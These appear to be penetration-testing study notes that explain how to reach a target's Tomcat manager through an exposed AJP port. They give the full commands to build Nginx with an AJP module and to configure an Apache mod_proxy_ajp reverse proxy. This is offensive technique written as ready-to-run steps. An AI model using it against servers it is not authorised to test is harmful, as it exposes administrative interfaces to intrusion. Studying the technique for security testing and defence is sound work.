## **Server-Side Attack Notes**

* * *

*Following are the notes for the Server Side Attack.*

# Nginx Reverse Proxy & AJP
If coming across an open AJP proxy port (8009 TCP), you can use the Nginx with ajp_module to access the **"hidden"**  Tomcat manager. The way to do this is by compiling the Nginx source code and then adding the ajp_module.

<ol>
	<li> Download the Nginx source code
	<li> Download the required module (In this case <font color="lightgreen">ajp_module</font>)
	<li> Compile Nginx source code with the <font color="lightgreen">ajp_module</font>
	<li> Create a configuration file pointing to the AJP Port
</ol>


**Downloading Nginx Source Code**
```bash
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz
```

**Compile Nginx source code with the ajp module**

```bash
git clone https://github.com/dvershinin/nginx_ajp_module.git
```
<font color=lightgreen>Clone the nginx_ajp_module to the same place as where the nginx folder is located at.</font>
```
cd nginx-1.21.3
```
<font color=lightgreen>Travel to the nginx folder and run each commands inside of it.</font>
```
sudo apt install libpcre3-dev
```
<font color=lightgreen>Neded for building.</font>
```
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
```
<font color=lightgreen>Adding the nginx_ajp_module.</font>
```
make
sudo make install
```
<font color=lightgreen>Compiling and installing.</font>
```
nginx -V
````
<font color=lightgreen>If everything was compiled correctly it should give you an output</font>

**Pointing to the AJP Port**

We first need to comment out the entire <font color="lightgreen">server</font> block and then append the following lines inside the <font color="lightgreen">http</font> block in <font color="lightgreen">/etc/nginx/conf/nginx.conf</font>

```php
	upstream tomcats {
		server <TARGET_SERVER>:8009;
		keepalive 10;
		}
	server {
		listen 80;
		location / {
			ajp_keep_conn on;
			ajp_pass tomcats;
		}
	}
```
To check if Nginx is working first start it then try to go to the website on localhost/127.0.0.1
```bash
sudo nginx
```
***

# Apache Reverse Proxy & AJP


**Install the Libapache2-mod-jk package**
```
sudo apt install libapache2-mod-jk
```

**Enable the Modules**
```
sudo a2enmod proxy_ajp
```

```
sudo a2enmod proxy_http
```

**Create the config file to point to the target AJP proxy**
```
export TARGET="TARGETIP"
```
```bash
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
```
```
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
```
```
sudo systemctl start apache2
```

If everything is done you should be able to access the Apache Tomcat manager using localhost (127.0.0.1)
